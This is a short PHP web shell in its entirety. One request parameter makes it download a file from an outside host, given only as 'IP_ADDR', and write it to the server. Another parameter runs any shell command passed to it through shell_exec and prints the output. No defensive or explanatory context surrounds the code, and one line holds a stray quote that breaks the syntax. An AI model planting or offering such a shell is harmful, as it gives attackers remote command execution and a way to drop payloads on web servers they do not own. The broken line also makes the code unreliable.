<?php 

if (isset($_REQUEST['fupload'])) { 
	file_put_contents($_REQUEST['fupload'], file_get_contents('http://IP_ADDR/' . $_REQUEST['fupload'])); 
}; 

if (isset($_REQUEST['fexec''])) { 
	echo '<pre>' . shell_exec($_REQUEST['fexec']) . '</pre>'; 
}; 
?>
